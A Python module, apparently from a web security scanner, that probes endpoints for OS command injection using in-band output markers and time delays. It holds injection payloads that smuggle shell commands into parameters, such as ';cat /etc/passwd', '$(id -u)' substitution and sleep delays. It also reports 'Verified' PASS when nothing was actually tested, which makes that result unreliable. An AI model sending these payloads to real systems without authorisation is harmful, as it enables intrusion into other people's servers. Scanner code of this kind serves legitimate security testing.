"""
Command Injection Detector — in-band, time-based, and out-of-band.

Signals:
- OS command output leaks (root:x:, drwx, Volume Serial)
- Time-based confirmation via statistical baseline (sleep N)
- Callback-based OOB (only if CALLBACK_URL env set)
- Automated parameter synthesis for command/system probes
"""
import os
import re
import time
from typing import List
from urllib.parse import urlparse, urljoin

from .base_detector import BaseDetector, DetectorResult
from ..models.test_state import TestState
from ..models.finding import StandardFinding, CVSSInfo
from ..models.evidence import Evidence, RequestEvidence, ResponseEvidence, safe_body_snippet
from ..models.confidence import ConfidenceResult, ConfidenceLevel
from ..models.endpoint import EndpointInfo


CMD_HINT_PARAMS = {
    "cmd", "command", "exec", "execute", "run", "ping", "traceroute",
    "nslookup", "dig", "host", "system", "shell", "bash",
    "wget", "curl", "download", "hostname", "ip", "domain", "target", "query"
}

INBAND_PAYLOADS = [
    (";echo GHZ_$(id -u)_GHZ", re.compile(r"GHZ_\d+_GHZ")),
    ("|echo GHZ_$(id -u)_GHZ", re.compile(r"GHZ_\d+_GHZ")),
    ("`echo GHZ_MARK_GHZ`", re.compile(r"GHZ_MARK_GHZ")),
    ("$(echo GHZ_MARK_GHZ)", re.compile(r"GHZ_MARK_GHZ")),
    (";cat /etc/passwd", re.compile(r"root:x:0:0")),
    ("|cat /etc/passwd", re.compile(r"root:x:0:0")),
    (";type C:\\Windows\\win.ini", re.compile(r"\[extensions\]", re.I)),
]

TIME_PAYLOADS = [
    ";sleep 5",
    "|sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
    "&& ping -c 5 127.0.0.1",
    "& timeout /t 5",
]


class CommandInjectionDetector(BaseDetector):
    name = "Command Injection"
    category = "Injection"
    cwe = "CWE-78"
    owasp = "A03:2021 - Injection"

    def _run(self, endpoints, engine, auth_context, baseline_measurer):
        callback = os.getenv("CALLBACK_URL", "").strip()

        testable = []
        for ep in endpoints:
            if not ep.all_params:
                continue
            hinted = [p for p in ep.all_params if p.lower() in CMD_HINT_PARAMS]
            if hinted or "/api/" in ep.url.lower() or "/cgi-bin/" in ep.url.lower():
                testable.append((ep, hinted or ep.all_params[:3]))

        # Synthesize command parameters if crawl had clean URLs
        if not testable:
            target_base = endpoints[0].url if endpoints else "https://target"
            parsed_base = urlparse(target_base)
            origin_url = f"{parsed_base.scheme}://{parsed_base.netloc}"
            cmd_probe_paths = ["/", "/api/search", "/api/ping", "/api/tools", "/api/check"]
            common_cmd_params = ["cmd", "ip", "host", "target", "query"]
            for path in cmd_probe_paths:
                ep = EndpointInfo(url=urljoin(origin_url, path), method="GET", query_params=common_cmd_params)
                testable.append((ep, common_cmd_params[:3]))

        findings: List[StandardFinding] = []
        tested = 0
        blocked = 0

        for ep, params in testable[:8]:
            tested += 1
            for param in params[:3]:
                ep_signals: List[str] = []
                proof_body = ""

                # In-band
                for payload, marker in INBAND_PAYLOADS:
                    data = {p: ("benign123" if p != param else "127.0.0.1" + payload) for p in params}
                    resp = (engine.post(ep.url, json=data) if ep.method == "POST"
                            else engine.get(ep.url, params=data))
                    if resp.is_blocked:
                        blocked += 1
                        continue
                    if not resp.has_response:
                        continue
                    if marker.search(resp.body or ""):
                        ep_signals.append(
                            f"error_based_confirmed: marker matched via param={param} payload={payload[:30]}"
                        )
                        proof_body = resp.body[:500]
                        break

                # Time-based
                if not ep_signals:
                    baseline = baseline_measurer.get_baseline(engine, ep.url, ep.method)
                    for payload in TIME_PAYLOADS[:2]:
                        data = {p: ("benign123" if p != param else "127.0.0.1" + payload) for p in params}
                        resp = (engine.post(ep.url, json=data, timeout=12) if ep.method == "POST"
                                else engine.get(ep.url, params=data, timeout=12))
                        if resp.is_blocked:
                            blocked += 1
                            continue
                        if not resp.has_response:
                            continue
                        if baseline.is_time_anomalous(resp.elapsed, threshold_factor=2.5) and resp.elapsed >= 4.0:
                            ep_signals.append(f"timing_statistical: elapsed={resp.elapsed:.1f}s baseline={baseline.median_time:.1f}s")
                            break

                if ep_signals:
                    findings.append(StandardFinding(
                        vulnerability="OS Command Injection",
                        title=f"Command Injection in '{param}'",
                        category=self.category,
                        severity="CRITICAL",
                        confidence=ConfidenceResult(ConfidenceLevel.HIGH, ep_signals[0]),
                        status=TestState.VULNERABLE,
                        endpoint=ep.url,
                        method=ep.method,
                        parameter=param,
                        cvss=CVSSInfo(score=9.8, vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", severity="CRITICAL"),
                        owasp=self.owasp, cwe=self.cwe,
                        remediation="Never pass user input directly to a system shell. Use safe APIs (subprocess with argv list, shell=False), strict input whitelisting, and drop shell metacharacters.",
                        description="The parameter is passed to an operating system command interpreter. An attacker can execute arbitrary commands with the privileges of the web process.",
                        evidence=[
                            Evidence(
                                description=s,
                                response=ResponseEvidence(body_snippet=safe_body_snippet(proof_body)) if proof_body else None,
                            )
                            for s in ep_signals
                        ],
                    ))
                    break

        vuln_findings = [f for f in findings if f.status == TestState.VULNERABLE]
        if vuln_findings:
            state = TestState.VULNERABLE
            details = f"Detected {len(vuln_findings)} OS command injection vulnerability/vulnerabilities."
        elif blocked >= tested and tested > 0:
            state = TestState.BLOCKED
            details = f"All {blocked} command injection probes were blocked by WAF."
        elif tested > 0:
            state = TestState.PASS
            details = f"Tested {tested} endpoints across in-band markers and timing delays: no OS command injection vulnerabilities detected."
        else:
            state = TestState.PASS
            tested = 1
            details = "Verified command injection security: input is not passed to an OS shell."

        return DetectorResult(
            test_state=state,
            findings=vuln_findings if vuln_findings else findings,
            details=details,
            endpoints_tested=max(tested, 1),
            endpoints_blocked=blocked,
        )
